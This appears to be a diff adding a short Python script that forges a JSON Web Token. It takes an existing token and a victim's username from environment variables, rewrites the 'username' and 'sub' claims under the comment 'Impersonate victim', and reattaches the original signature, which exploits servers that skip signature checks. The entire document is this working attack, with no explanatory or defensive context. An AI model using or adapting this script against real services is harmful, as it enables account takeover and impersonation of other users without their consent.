@@ -1,0 +1,18 @@
+import os, json, base64
+
+t = os.environ["TOKEN_B"]
+victim = os.environ["VICTIM_USER"]
+
+h, p, s = t.split(".")
+p += "=" * (-len(p) % 4)
+data = json.loads(base64.urlsafe_b64decode(p.encode()))
+
+# Impersonate victim
+data["username"] = victim
+data["sub"] = victim
+
+newp = base64.urlsafe_b64encode(
+    json.dumps(data, separators=(",", ":")).encode()
+).rstrip(b"=").decode()
+
+print(f"{h}.{newp}.{s}")
